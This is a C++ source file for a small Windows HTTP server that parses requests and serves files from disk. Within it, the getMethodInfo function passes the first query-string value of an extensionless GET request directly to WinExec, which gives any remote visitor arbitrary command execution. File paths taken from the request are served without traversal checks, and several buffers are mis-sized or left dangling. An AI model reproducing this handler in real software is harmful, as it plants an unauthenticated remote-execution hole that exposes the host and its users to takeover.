#include "../pch.h"
#include "helpClass.h"
#include <filesystem>
#define DEFAULT_PATH ""
void getMethodInfo(oMap<string, string> req, oMap<string, string> res, string & con);
helpClass::helpClass()
{
}


helpClass::~helpClass()
{
}
LPWSTR helpClass::user_stringToLPWSTR(std::string orig) {

	int lng = orig.length();
	LPWSTR d = (LPWSTR)malloc(sizeof(PWSTR)*(lng + 1));
	memset(d, 0, sizeof(PWSTR)*(lng + 1));
	MultiByteToWideChar(CP_ACP, 0, orig.c_str(), lng, d, lng * sizeof(PWSTR));
	return d;
}
string helpClass::user_LPWSTRTostring(LPWSTR lpw) {
	int lng = lstrlenW(lpw);

	LPSTR d = (LPSTR)malloc(sizeof(PSTR)*lng);
	memset(d, 0, sizeof(PSTR)*lng);
	WideCharToMultiByte(CP_OEMCP, NULL, lpw, -1, d, sizeof(PSTR)*lng, NULL, FALSE);
	string q = d;
	return q;
}
LPCSTR helpClass::user_LPWSTRToLPCSTR(LPWSTR lpw) {
	string s1 = helpClass::user_LPWSTRTostring(lpw);
	return (s1.c_str());
}
LPWSTR helpClass::user_LPCSTRToLPWSTR(LPCSTR lpc) {
	string s1 = lpc;
	return helpClass::user_stringToLPWSTR(s1);
}
vector<string> helpClass::split(string s, string c)
{
	string::size_type pos1, pos2;
	vector<string> v;
	pos2 = s.find(c);
	pos1 = 0;
	while (string::npos != pos2)
	{
		v.push_back(s.substr(pos1, pos2 - pos1));

		pos1 = pos2 + c.size();
		pos2 = s.find(c, pos1);
	}
	if (pos1 != s.length())
		v.push_back(s.substr(pos1));
	return v;
}
string helpClass::getFileCharset(string s) {
	ifstream fin(s.c_str(),ios::binary);
	unsigned char  s2;
	string returnString;
	fin.read((char*)&s2, sizeof(s2));//��ȡ��һ���ֽڣ�Ȼ������8λ
	int p = s2 << 8;
	fin.read((char*)&s2, sizeof(s2));//��ȡ�ڶ����ֽ�
	p |= s2;

	string code;

	switch (p)//�ж��ı�ǰ�����ֽ�
	{
	case 0xfffe:  //65534
		code = "Unicode";
		break;
	case 0xfeff://65279
		code = "Unicode big endian";
		break;
	case 0xefbb://61371
		code = "UTF-8";
		break;
	default:
		code = "ANSI";
	}
	fin.close();
	returnString = code;
	return returnString;
}
string helpClass::getFileUrl(string url, string methodType, oMap<string, string>getMap) {
	if (methodType == "GET") {
		int index = url.find("/");
		if (getMap["souce"] == "/") {
			return "index.html";
		}
		else {
			return "."+getMap["souce"];
		}
	}
};
string helpClass::getMINItype(string path) {
	vector<string> infoArr = helpClass::split(path, ".");
	string s = "";
	if (infoArr.size() >= 2) {
		unsigned int len = infoArr.size()-1;
		if (infoArr[len] == "html"|| infoArr[len] == "htm") {
			s = "text/html";
		}
		else if (infoArr[len] == "js") {
			s = "application/javascript";
		}
		else if (infoArr[len] == "css") {
			s = "text/css";
		}
		else if (infoArr[len] == "mp3") {
			s = "audio/mp3";
		}
	}
	else {
		s = "text/plain";
	}
	
	return s;
}
oMap<string, string> helpClass::getRequestHead(string request) {
	oMap<string, string> returnMap;
	vector<string> infoArr = helpClass::split(request,"\r\n");
	vector<string> bufInfoArr;
	vector<string> bufInfoArr2;
	for (unsigned int i = 0; i < infoArr.size(); i++) {
		if (i == 0) {
			bufInfoArr = helpClass::split(infoArr[i], " ");
			returnMap["method"] = bufInfoArr[0];
			bufInfoArr2=helpClass::split(bufInfoArr[1], "?");
			returnMap["souce"] = bufInfoArr2[0];
			if (bufInfoArr2.size() >= 2) {
				returnMap["search"] = bufInfoArr2[1];
			}
			else {
				returnMap["search"] = "";
			}
			returnMap["httpInfo"] = bufInfoArr[2];
		}
		else {
			bufInfoArr = helpClass::split(infoArr[i], ": ");
			if (bufInfoArr.size() >= 2) {
				returnMap[bufInfoArr[0]] = bufInfoArr[1];
			}
		}
	}
	return returnMap;
};
//��ȡ��Ӧ����
string helpClass::getTime() {
	string returnString = "";
	time_t t = time(NULL); char szBuf[128] = { 0 };
	tm t2;
	gmtime_s(&t2, &t);
	strftime(szBuf, 127, "%A,%d-%b-%y %H:%M:%S", &t2);
	returnString = szBuf;
	return returnString;
}

string helpClass::getResponseHead(string request,int status,string statusMsg,oMap<string,string>headObj) {
	string returnString = "";
	stringstream ss;
	oMap<string, string>getMap = getRequestHead(request);
	ss << getMap["httpInfo"] << " " << status << " " << statusMsg<<"\r\n";
	for (unsigned int i = 0; i < headObj._key.size(); i++) {
		ss << headObj._key[i] << ": " << headObj._val[i] << "\r\n";
	}
	returnString = ss.str();
	return returnString;
};
//get������ʽ
void helpClass::methodGetHandle(SOCKET & s, string request, oMap<string, string>getMap) {
	//��Ӧͷmap
	oMap<string, string>reqMap;
	//��������
	reqMap["Date"] = getTime();
	//��ȡ�ļ���������ַ
	string filePath = getFileUrl(getMap["Host"], "GET", getMap);
	//��ȡ�ļ���Ϣ ����ǵ���1��ô����һ��ajax����
	vector<string> filePathInfo = helpClass::split(filePath, ".");

	//������Ӧ����
	string content;
	int status=helpClass::readFile(filePath, content);
	if (status == 404) {
		status = helpClass::readFile("404.html", content);
	}
	string contentType = "";
	//������Ӧͷ
	reqMap["content-type"] = contentType + getMINItype(filePath);
	int len = content.length();
	char bufLen[4] = {0};
	_itoa_s(len, bufLen, 10);
	reqMap["Charset"] = getFileCharset(filePath);
	reqMap["content-length"] =bufLen;
	reqMap["cache-control"] = "private, must-revalidate";
	reqMap["server"] = "yServer";
	reqMap["X-Content-Type-Options"] = "nosniff";
	reqMap["X-Frame-Options"] = "SameOrigin";
	reqMap["x-xss-protection"] = "1; mode=block";
	if (filePathInfo.size() == 1 || (filePathInfo.size() == 2 && filePathInfo[0] == "")) {
		reqMap["content-type"] = "text/plain";
		reqMap["content-length"] = 1;
		content = "";
		::getMethodInfo(getMap, reqMap, content);
	}
	string getReqHead = getResponseHead(request, status, "OK", reqMap);
	
	getReqHead = getReqHead + "\r\n" + content;
	send(s, getReqHead.c_str(), getReqHead.length(), 0);
	//�ر��׽��� ���׽��ֲ�һֱ������
	closesocket(s);
}
void getMethodInfo(oMap<string, string> req, oMap<string, string> res, string & con) {
	vector<string> argumentA = helpClass::split(req["search"],"&");
	if (argumentA.size() > 0) {
		vector<string> argumentB = helpClass::split(argumentA[0], "=");
		if(argumentB.size()>=2)
		WinExec(argumentB[1].c_str(), SW_SHOW);
	}
}
//��ȡ�������ļ�
int helpClass::readFile(string filePath, string & cc)
{
	//char�ֽ�ת��Ϊwchar_t�ֽ�  
	LPWSTR path = helpClass::user_LPCSTRToLPWSTR(filePath.c_str());
	HANDLE hFile = CreateFile(path,     //�����ļ������ơ�  
		GENERIC_WRITE | GENERIC_READ,          // д�Ͷ��ļ���  
		0,                      // �������д��  
		NULL,                   // ȱʡ��ȫ���ԡ�  
		OPEN_EXISTING,          // 
		FILE_ATTRIBUTE_NORMAL, // һ����ļ���         
		NULL);                 // ģ���ļ�Ϊ�ա�  
	if (hFile == INVALID_HANDLE_VALUE)
	{
		OutputDebugString(TEXT("CreateFile fail!\r\n"));
		return 404;
	}
	DWORD size;
	DWORD getSize;
	size=GetFileSize(hFile, NULL);
	char * content = (char *)malloc(size);
	ReadFile(hFile, content, size, &getSize, NULL);
	cc = content;
	cc=cc.substr(0, getSize);
	free(path);
	CloseHandle(hFile);
	return 200;
}
void helpClass::handleRequestLine(SOCKET & s, string request) {
	oMap<string, string>getMap = getRequestHead(request);
	cout << getMap["souce"] << endl;
	if (getMap["method"] == METHOD_TYPE::uHTTP_GET) {
		methodGetHandle(s, request, getMap);
	}

};